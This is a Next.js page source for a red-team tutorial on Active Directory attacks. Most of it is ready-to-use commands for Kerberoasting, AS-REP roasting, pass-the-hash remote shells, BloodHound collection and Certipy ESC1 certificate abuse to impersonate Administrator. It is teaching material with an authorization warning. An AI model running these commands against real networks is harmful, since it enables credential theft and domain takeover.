import { Metadata } from 'next';
import GuideLayout from '@/components/GuideLayout';

export const metadata: Metadata = {
  title: 'Active Directory Attacks Guide | Kerberoasting, BloodHound | Zentrion',
  description: 'Complete tutorial on Active Directory attacks. Learn Kerberoasting, AS-REP Roasting, BloodHound enumeration, Pass-the-Hash, and AD CS exploitation.',
  keywords: 'active directory attack, kerberoasting, bloodhound ad, as-rep roasting, pass the hash, ad cs attacks',
};

export default function ActiveDirectoryAttacksPage() {
  return (
    <GuideLayout
      title="Active Directory Attacks – Complete Guide"
      description="Microsoft's Active Directory (AD) manages 90% of global corporate networks. Learn the end-to-end attack lifecycle: from initial enumeration and Kerberoasting to Domain Admin privilege escalation."
      timeToRead="50 min read"
      lastUpdated="September 2026"
      tags={['Active Directory', 'Red Teaming', 'Advanced']}
      tools={[
        { name: 'Nmap Scan Generator', url: '/tools/nmap-generator' }
      ]}
      relatedGuides={[
        { title: 'Kali Linux Pentesting', url: '/guides/kali-linux-pentesting-tutorial' },
        { title: 'Linux Privilege Escalation', url: '/guides/linux-privilege-escalation' }
      ]}
      headings={[
        { id: 'enumeration', label: 'Phase 1: AD Enumeration' },
        { id: 'kerberoasting', label: 'Phase 2: Kerberoasting' },
        { id: 'asrep', label: 'Phase 3: AS-REP Roasting' },
        { id: 'pth', label: 'Phase 4: Pass-the-Hash' },
        { id: 'bloodhound', label: 'Phase 5: BloodHound' },
        { id: 'adcs', label: 'Phase 6: AD CS Attacks' },
        { id: 'lab', label: 'Free AD Practice Labs' }
      ]}
    >
      <div className="callout-warning">
        <strong>⚠️ Warning:</strong> These techniques are highly disruptive. Only execute these attacks on networks you have explicit, written authorization to test (e.g., dedicated practice labs).
      </div>

      <h2 id="enumeration">Phase 1: AD Enumeration</h2>
      <p>Before launching attacks, you must map the network, identify Domain Controllers, and enumerate users and groups.</p>
      
      <h3>Find the Domain Controller (DC)</h3>
      <pre><code>{`# From a Kali Linux attack box:
nmap -sV -sC <target_ip>

# Look for open ports:
# 88 (Kerberos), 135 (RPC), 389 (LDAP), 445 (SMB), 636 (LDAPS)`}</code></pre>

      <h3>Enumerate Users & Groups</h3>
      <p>We use <strong>CrackMapExec</strong> (now often forked as <strong>NetExec / nxc</strong>) or <strong>Impacket</strong> to query the DC.</p>
      <pre><code>{`# Enumerate users (Anonymous/Null session if enabled)
crackmapexec smb <target_ip> -u '' -p '' --users

# Enumerate groups
crackmapexec smb <target_ip> -u '' -p '' --groups

# Enumerate users using Impacket (requires valid credentials)
getADUsers.py domain/user:pass@dc.target.com`}</code></pre>

      <h2 id="kerberoasting">Phase 2: Kerberoasting</h2>
      <p>Kerberoasting targets Service Principal Names (SPNs). When a user requests a ticket (TGS) to access a service, the DC encrypts part of the ticket with the service account's password hash. You can extract this ticket and crack it offline.</p>
      
      <pre><code>{`# Step 1: Find SPNs and Extract Tickets (Using Impacket from Kali)
GetUserSPNs.py -dc-ip <dc_ip> domain/user:pass -request -outputfile tickets.txt

# Step 2: Crack Tickets Offline (Hashcat mode 13100)
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

# Step 2 Alternative: Using John the Ripper
john --format=krb5tgs tickets.txt --wordlist=rockyou.txt`}</code></pre>

      <h2 id="asrep">Phase 3: AS-REP Roasting</h2>
      <p>If a user account has the "Do not require Kerberos preauthentication" property enabled, anyone can request an AS-REP ticket for that user, which contains data encrypted with the user's password hash.</p>
      
      <pre><code>{`# Step 1: Find Vulnerable Accounts and Extract Hash
GetNPUsers.py domain/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat > asrep_hashes.txt

# Step 2: Crack AS-REP Hashes (Hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`}</code></pre>

      <h2 id="pth">Phase 4: Pass-the-Hash (PtH)</h2>
      <p>In Windows environments, if you obtain an NTLM hash (e.g., from dumping the SAM database or via DCSync), you do not need to crack it to authenticate. You can simply "pass the hash."</p>
      
      <pre><code>{`# Execute commands using an NTLM hash with CrackMapExec:
crackmapexec smb <target_ip> -u target_user -H <NTLM_HASH>

# Remote Shell via Impacket's PsExec:
psexec.py domain/user:<NTLM_HASH>@<target_ip> cmd.exe

# Remote Shell via WMI (stealthier):
wmiexec.py domain/user:<NTLM_HASH>@<target_ip>`}</code></pre>

      <h2 id="bloodhound">Phase 5: BloodHound (Visualizing Attack Paths)</h2>
      <p>BloodHound uses graph theory to reveal hidden relationships and attack paths within Active Directory.</p>
      
      <pre><code>{`# 1. Collect Data (from a compromised Windows machine in the domain)
# Download SharpHound and run:
SharpHound.exe -c All -zn domain.com -d domain.com

# 2. This generates a zip file. Transfer it back to your Kali box.
# 3. Start Neo4j (database) and BloodHound GUI on Kali.
# 4. Import the zip file.
# 5. Right-click the compromised user -> "Find shortest path to Domain Admins".`}</code></pre>

      <h2 id="adcs">Phase 6: AD CS (Certificate Services) Attacks</h2>
      <p>Misconfigured Certificate Authorities (AD CS) allow attackers to request certificates on behalf of other users (including Domain Admins).</p>
      
      <pre><code>{`# 1. Enumerate vulnerable certificate templates using Certipy (Free tool)
pip install certipy
certipy find -u user@domain.com -dc-ip <dc_ip> -v

# 2. ESC1 Attack (If a template allows Client Authentication & ENROLLEE_SUPPLIES_SUBJECT)
# Request a certificate for the Administrator account
certipy req -u user@domain.com -p pass -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@domain.com

# 3. Use the generated certificate to get the Administrator NTLM hash
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>`}</code></pre>

      <h2 id="lab">Free AD Practice Labs</h2>
      <p>Building an AD lab from scratch is complex. Use these open-source resources instead:</p>
      <ul>
        <li><a href="https://github.com/ly4k/GoAD" target="_blank" rel="noopener noreferrer">Game of Active Directory (GoAD)</a> — An open-source, automated vulnerable AD lab built with Vagrant.</li>
        <li><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener noreferrer">GOAD by Orange Cyberdefense</a> — Another excellent automated vulnerable lab provisioning tool.</li>
        <li><a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> — The essential tool for visualizing AD attack paths.</li>
      </ul>
    </GuideLayout>
  );
}
